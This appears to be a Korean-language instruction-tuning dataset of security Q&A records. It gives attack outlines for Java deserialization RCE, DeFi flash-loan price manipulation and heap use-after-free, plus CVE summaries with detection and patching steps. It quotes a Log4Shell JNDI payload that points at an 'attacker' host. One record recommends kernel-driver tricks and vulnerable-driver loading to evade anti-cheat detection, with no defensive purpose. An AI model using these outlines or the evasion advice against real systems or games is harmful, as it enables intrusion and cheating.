{"instruction": "Web Hacking: Java/Spring 환경에서 역직렬화(Deserialization) 취약점을 이용한 RCE 시나리오를 작성하라.", "context": "Library: Commons-Collections 3.1, EntryPoint: ObjectInputStream.readObject()", "response": "1. 분석: 입력 데이터가 검증 없이 readObject()로 전달됨. 2. 공격: InvokerTransformer를 포함한 Gadget Chain 구성. 3. 페이로드: ysoserial 도구를 사용하여 Runtime.exec() 호출용 직렬화 객체 생성. 4. 대응: 서명된 객체만 수용하거나 최신 라이브러리로 업데이트하고, Look-ahead 역직렬화 기법 적용."}
{"instruction": "DeFi: Uniswap V2 기반 AMM에서 Flashloan을 이용한 가격 조작 공격(Price Manipulation) 로직을 설명하라.", "context": "Pair: ETH/USDT, Flashloan Provider: Aave V3", "response": "1. 시나리오: Aave에서 대량의 ETH 대여 -> Uniswap ETH/USDT 풀에 ETH를 대량 투입하여 USDT 가격 왜곡 -> 왜곡된 가격을 참조하는 타 Lending 프로토콜에서 담보 대출 실행 -> 대여금 상환 후 차익 실현. 2. 핵심: 오라클 가격 결정 방식의 취약점을 이용함. 3. 대응: 단일 트랜잭션 가격 참조 금지 및 TWAP(Time-Weighted Average Price) 오라클 도입."}
{"instruction": "System: Linux x64 환경에서 Use-After-Free(UAF) 취약점을 이용한 함수 포인터 덮어쓰기 과정을 서술하라.", "context": "Binary: C-based network daemon, Vulnerability: Heap object reuse", "response": "1. 취약점: 객체 free 후 포인터를 NULL로 초기화하지 않음(Dangling Pointer). 2. 공격: 동일한 크기의 메모리를 할당받아(kmalloc-like) 함수 포인터가 위치한 오프셋에 system() 주소를 삽입. 3. 실행: 해제된 포인터를 다시 참조(dereference)하여 공격자 코드 실행. 4. 대응: 포인터 수명 주기 관리 철저 및 Safe-Free 라이브러리 활용."}
{"instruction": "Game Security: EAC(Easy Anti-Cheat) 환경에서 탐지를 회피하기 위한 커널 드라이버 매핑 전략을 제안하라.", "context": "Environment: Windows 11, Ring 0, Driver manual mapping", "response": "1. 전략: 드라이버를 정상적인 시스템 드라이버인 것처럼 가장하기 위해 Manual Mapping 사용. 2. 우회 기술: MmCopyVirtualMemory를 이용한 직접 접근, PID 은닉, 스레드 가로채기(Hijacking). 3. 안티치트 대응: 드라이버 서명 확인(DSE) 및 커널 스택 워킹 탐지 주의. 4. 추천: 취약한 합법 드라이버(BYOVD)를 로드하여 커널 권한 탈취 후 타겟 드라이버 매핑."}
{"instruction": "CVE-2021-44228(Log4Shell) 취약점의 원인과 영향, 방어 방법을 요약하라.", "context": "Stack: Java 8/11, Log4j 2.14.1, JNDI LDAP lookup 허용", "response": "1. 원인: 로그 메시지에서 ${jndi:ldap://attacker/a} 형태의 Lookups가 기본 활성화되어 원격 코드 로딩이 가능. 2. 영향: RCE 및 정보 유출, Log4j를 사용한 모든 Java 서비스에 광범위한 영향. 3. 탐지: 로그에 ${jndi: 문자열 존재 여부, egress 트래픽의 비정상 LDAP/DNS 요청 모니터링. 4. 대응: 2.17.1 이상 업그레이드, message lookup 비활성화(-Dlog4j2.formatMsgNoLookups=true), JNDI egress 차단, WAF에서 패턴 필터링."}
{"instruction": "CVE-2014-0160(Heartbleed) TLS Heartbeat 오버리드 취약점을 설명하고 완화책을 제시하라.", "context": "OpenSSL 1.0.1f, TLS Heartbeat 확장 활성화", "response": "1. 원인: Heartbeat 요청 길이 검증 누락으로 최대 64KB 메모리 오버리드. 2. 영향: 비밀키, 세션 쿠키, 사용자 데이터 노출 가능. 3. 탐지: IDS에서 비정상 Heartbeat 요청 길이, OpenSSL 취약 버전 스캔. 4. 대응: OpenSSL 1.0.1g 이상 패치 또는 Heartbeat 비활성화, 인증서 재발급 및 세션 무효화."}
{"instruction": "CVE-2017-0144(EternalBlue) SMBv1 취약점을 통한 RCE 메커니즘과 방어를 설명하라.", "context": "OS: Windows 7/Server 2008 R2, SMBv1 활성화", "response": "1. 원인: SMBv1의 트랜잭션 재조합 버그로 커널 메모리 손상 가능. 2. 영향: 인증 없이 원격 코드 실행 및 웜 전파(MS17-010 미적용 시). 3. 탐지: 445 포트 비정상 트래픽, 유사 DoublePulsar Beacon, 이벤트 로그 4624/4625 패턴 분석. 4. 대응: MS17-010 적용, SMBv1 비활성화, 내부망 세그멘테이션 및 IDS 시그니처 배포."}
{"instruction": "CVE-2022-0847(Dirty Pipe) 로컬 권한 상승 취약점의 동작 원리와 대응책을 설명하라.", "context": "Linux Kernel 5.8+ (5.16.11/5.15.25/5.10.102 미만)", "response": "1. 원인: pipe buffer flag 초기화 결함으로 읽기 전용 파일에도 덮어쓰기 가능. 2. 영향: 비특권 사용자가 setuid 바이너리나 /etc/passwd 등을 덮어 권한 상승. 3. 탐지: 커널 버전 점검 및 비정상 pipe write 패턴 모니터링. 4. 대응: 커널 패치 적용, 컨테이너 환경에서의 CAP_SYS_RESOURCE 최소화, 불필요한 setuid 바이너리 제거."}
{"instruction": "CVE-2019-11510 Pulse Secure VPN 디렉터리 트래버설 취약점의 악용 흐름과 방어책을 요약하라.", "context": "Appliance: Pulse Connect Secure 9.0R3 이전", "response": "1. 원인: /dana-na/ 경로 처리 시 입력 검증 부족으로 임의 파일 읽기 가능. 2. 영향: /etc/passwd, 세션 토큰, 인증서 키 유출을 통한 VPN 침해. 3. 탐지: 웹 로그의 ../../ 패턴, 비정상 세션 생성, 관리 포털 접근 시도. 4. 대응: 9.0R3 이상 패치, 취약 장비 격리, 인증서/비밀번호 교체 및 세션 전면 무효화."}
{"instruction": "CVE-2021-26084 Atlassian Confluence OGNL 인젝션 취약점의 위험성과 완화 조치를 설명하라.", "context": "Confluence Server/Data Center 6.13.23 이전, OGNL 처리 필터 미흡", "response": "1. 원인: OGNL 표현식 입력 검증 부재로 서버 측 임의 코드 실행 가능. 2. 영향: 인증 여부와 관계없이 RCE, 웹쉘 설치 및 내부망 피벗 가능. 3. 탐지: access_log에서 %{, OGNL 키워드 포함 요청, 인가 없는 POST/GET 폭주. 4. 대응: 7.4.17/7.13.7/7.14.3/7.15.3 이상 업그레이드, WAF에서 OGNL 패턴 차단, 외부 노출 최소화."}